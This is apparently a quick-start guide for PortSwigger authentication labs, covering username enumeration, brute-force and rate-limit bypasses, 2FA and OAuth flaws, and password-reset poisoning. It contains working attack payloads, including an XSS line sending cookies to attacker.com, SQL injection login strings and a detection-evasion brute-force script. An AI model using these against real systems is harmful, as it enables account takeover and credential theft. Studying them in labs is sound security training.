# Authentication Vulnerabilities - Quick Start Guide

## Rapid Testing Methodology (5-15 Minutes)

### Phase 1: Initial Reconnaissance (2 minutes)
```bash
# 1. Identify login endpoints
# Check for: /login, /signin, /auth, /authenticate, /oauth

# 2. Test basic authentication
curl -X POST https://target.com/login \
  -d "username=test&password=test" \
  -v

# 3. Check for authentication methods
# - Traditional login forms
# - OAuth/SSO providers
# - API key authentication
# - JWT tokens
# - Multi-factor authentication
```

### Phase 2: Username Enumeration (3 minutes)
```bash
# Test with valid and invalid usernames
# Look for differences in:
# - Response messages
# - Response length
# - Response timing
# - HTTP status codes
# - Redirect behavior

# Using Burp Suite Intruder:
# 1. Capture POST /login request
# 2. Send to Intruder
# 3. Set username as payload position
# 4. Load username wordlist
# 5. Sort by response length
# 6. Identify valid usernames
```

### Phase 3: Password Attacks (5 minutes)
```bash
# 1. Test brute-force protection
# Multiple failed attempts → Check for account lockout

# 2. Test rate limiting bypasses
# Add X-Forwarded-For header with rotating IPs

# 3. Brute-force passwords for valid usernames
# Using Burp Intruder with password wordlist

# 4. Test credential stuffing
# Use leaked credentials from breaches
```

### Phase 4: Authentication Bypass (5 minutes)
```bash
# 1. Test parameter manipulation
# Change user_id, role, admin parameters in cookies/tokens

# 2. Test forced browsing
# After login page, directly access /admin, /dashboard

# 3. Test OAuth flows
# Modify email in POST /authenticate
# Check for state parameter in OAuth URLs

# 4. Test 2FA bypasses
# Skip verification by accessing protected pages directly
# Manipulate verify parameter to target other users
```

## Common Attack Vectors

### 1. Username Enumeration

**Different Response Messages:**
```
Invalid username: "Invalid username or password"
Valid username: "Incorrect password"
```

**Timing Attacks:**
```python
# Valid usernames process password hash, taking longer
import time
import requests

def check_timing(username):
    start = time.time()
    requests.post("https://target.com/login",
        data={"username": username, "password": "a"*100})
    return time.time() - start

# Valid users take longer (>0.1s difference)
```

**Account Lock Behavior:**
```
Invalid username: Never locks
Valid username: "Too many attempts" after 3-5 tries
```

### 2. Brute-Force Protection Bypasses

**IP Rotation:**
```http
POST /login HTTP/1.1
Host: target.com
X-Forwarded-For: 1.1.1.1

username=admin&password=test1

# Increment IP for each attempt
```

**Counter Reset:**
```
# Alternate between valid login and attack
1. username=your_account&password=your_pass (success, resets counter)
2. username=target&password=test1 (attempt)
3. username=your_account&password=your_pass (success, resets counter)
4. username=target&password=test2 (attempt)
```

**Multiple Credentials Per Request:**
```json
{
  "username": "carlos",
  "password": ["pass1", "pass2", "pass3", "pass4"]
}
```

### 3. Multi-Factor Authentication Bypasses

**Simple Bypass:**
```
1. Login with username:password
2. Reach 2FA verification page
3. Manually navigate to /my-account (skip verification)
```

**Parameter Manipulation:**
```http
POST /login2 HTTP/1.1
Host: target.com

mfa-code=1234&verify=carlos

# The 'verify' parameter controls which user's account is accessed
# Manipulate to target other users
```

**Brute-Force 2FA Codes:**
```bash
# 4-digit codes: 0000-9999 (10,000 combinations)
# Use Burp Intruder with Numbers payload type
# Range: 0-9999, Step: 1, Digits: 4
# Set resource pool to 1 concurrent request
# Configure session handling macro for re-authentication
```

### 4. OAuth Vulnerabilities

**Implicit Flow Bypass:**
```http
POST /authenticate HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "email": "victim@target.com",
  "username": "victim",
  "token": "attacker_valid_token"
}

# Modify email parameter to target victim
```

**Missing State Parameter:**
```html
<!-- CSRF in OAuth profile linking -->
<iframe src="https://target.com/oauth-linking?code=STOLEN_CODE"></iframe>
```

**redirect_uri Exploitation:**
```
# Original:
https://oauth-server.com/auth?redirect_uri=https://target.com/callback

# Exploit:
https://oauth-server.com/auth?redirect_uri=https://attacker.com
https://oauth-server.com/auth?redirect_uri=https://target.com/callback/../proxy-page
```

### 5. Session Management Issues

**Stay-Logged-In Cookie:**
```
# Cookie structure: base64(username:md5(password))
Cookie: stay-logged-in=Y2FybG9zOmUxMGFkYzM5NDliYTU5YWJiZTU2ZTA1N2YyMGY4ODNl

# Decode:
carlos:e10adc3949ba59abbe56e057f20f883e

# Brute-force password, construct valid cookie
```

**XSS for Cookie Theft:**
```javascript
<script>
document.location='//attacker.com/'+document.cookie
</script>
```

### 6. Password Reset Vulnerabilities

**Broken Token Validation:**
```http
POST /forgot-password HTTP/1.1
Host: target.com

temp-forgot-password-token=&username=carlos&new-password=hacked

# Empty token still accepted
```

**Host Header Poisoning:**
```http
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

username=carlos

# Reset link: https://attacker.com/reset?token=VICTIM_TOKEN
```

**Password Change Enumeration:**
```http
POST /change-password HTTP/1.1

username=carlos&current-password=test&new-password-1=123&new-password-2=abc

# "New passwords do not match" → current password correct
# "Current password incorrect" → wrong password (no lockout)
```

### 7. Business Logic Flaws

**Flawed State Machine:**
```
Normal: POST /login → GET /role-selector → POST /role-selector → GET /
Exploit: POST /login → DROP /role-selector → GET / (defaults to admin)
```

**Encryption Oracle:**
```
# Application encrypts/decrypts user input
1. Identify encryption oracle endpoints
2. Encrypt: administrator:timestamp
3. Manipulate ciphertext (remove prefix blocks)
4. Use as stay-logged-in cookie
```

## Burp Suite Quick Commands

### Intruder Configuration
```
Attack Types:
- Sniper: Single payload position (username OR password)
- Pitchfork: Multiple positions, corresponding payloads (IP + username)
- Cluster Bomb: All combinations (username × password)

Payload Processing:
1. Add prefix: "username:"
2. Hash: MD5
3. Encode: Base64

Grep Match:
- Success indicators: "Welcome", "Logout", "Update email"
- Error messages: "Invalid", "Incorrect"

Resource Pool:
- Max concurrent: 1 (for session-based attacks)
```

### Repeater Workflow
```
1. Capture request
2. Send to Repeater
3. Modify parameters
4. Observe response
5. Test variations
```

### Session Handling Macros
```
For 2FA brute-force:
1. Settings → Sessions → Session Handling Rules
2. Add new rule
3. Add macro with login sequence:
   - GET /login
   - POST /login
   - GET /login2
4. Set scope to include target URLs
```

## Common Wordlists

### Username Lists
```bash
# Common usernames
admin
administrator
root
user
test
guest
carlos
wiener

# PortSwigger wordlist
https://portswigger.net/web-security/authentication/auth-lab-usernames
```

### Password Lists
```bash
# Top passwords
password
123456
admin
letmein
welcome

# PortSwigger wordlist
https://portswigger.net/web-security/authentication/auth-lab-passwords

# SecLists
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/Common-Credentials/
```

## Quick Wins Checklist

### 5-Minute Tests
- [ ] Test username enumeration via error messages
- [ ] Try default credentials (admin:admin, admin:password)
- [ ] Test SQL injection in login (`admin'--`, `admin' OR '1'='1`)
- [ ] Check for missing 2FA enforcement
- [ ] Test direct access to /admin after partial authentication
- [ ] Look for exposed credentials in JavaScript/HTML comments
- [ ] Test password reset with no/empty token
- [ ] Check for OAuth state parameter
- [ ] Test session fixation/hijacking

### 15-Minute Deep Dive
- [ ] Brute-force usernames with timing analysis
- [ ] Test IP-based rate limiting bypass
- [ ] Enumerate passwords for valid usernames
- [ ] Test 2FA parameter manipulation
- [ ] Analyze stay-logged-in cookie structure
- [ ] Test OAuth redirect_uri validation
- [ ] Check for host header poisoning in password reset
- [ ] Test account lock bypass techniques
- [ ] Look for business logic flaws in authentication flow

## Detection Evasion

### Rate Limiting Bypass
```http
# Rotate headers
X-Forwarded-For: 1.1.1.1
X-Originating-IP: 1.1.1.1
X-Remote-IP: 1.1.1.1
X-Client-IP: 1.1.1.1
```

### Timing and Throttling
```python
import time
import random

def smart_brute_force(username, passwords):
    for password in passwords:
        # Random delay between requests
        time.sleep(random.uniform(0.5, 2.0))

        # Test credential
        result = test_login(username, password)

        if result.status_code == 302:
            return password
```

### User-Agent Rotation
```python
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)"
]
```

## Success Indicators

### Valid Username Found
- Different error message
- Different response length
- Longer response time
- Account lockout message
- Password reset email sent

### Valid Password Found
- HTTP 302 redirect
- Session cookie issued
- "Welcome" or "Logout" in response
- Access to protected resources

### 2FA Bypassed
- Access to protected pages without verification
- Session established without code
- Parameter manipulation accepted

### OAuth Exploited
- Authentication as victim user
- Access token leaked
- Admin access via social profile linking

## Common Mistakes to Avoid

1. **Not testing systematically** - Test one thing at a time
2. **Ignoring subtle differences** - Whitespace, punctuation matter
3. **Using wrong attack type** - Pitchfork vs Cluster Bomb
4. **Not handling sessions** - Use macros for session-based attacks
5. **Missing response analysis** - Sort by length, status, timing
6. **Forgetting to URL-encode** - Encode special characters
7. **Not testing all parameters** - Check cookies, headers, JSON
8. **Rushing past reconnaissance** - Understand the flow first

## Resources

### PortSwigger Labs
- Authentication Labs: https://portswigger.net/web-security/authentication
- Candidate Usernames: https://portswigger.net/web-security/authentication/auth-lab-usernames
- Candidate Passwords: https://portswigger.net/web-security/authentication/auth-lab-passwords

### Tools
- Burp Suite: https://portswigger.net/burp
- Hydra: https://github.com/vanhauser-thc/thc-hydra
- Patator: https://github.com/lanjelot/patator
- SecLists: https://github.com/danielmiessler/SecLists

### References
- OWASP Authentication: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/
- OAuth 2.0 RFC: https://tools.ietf.org/html/rfc6749
- NIST Guidelines: https://pages.nist.gov/800-63-3/

---

*Quick-start guide for rapid authentication vulnerability testing*
*Time to complete all labs: 2-6 hours depending on complexity*
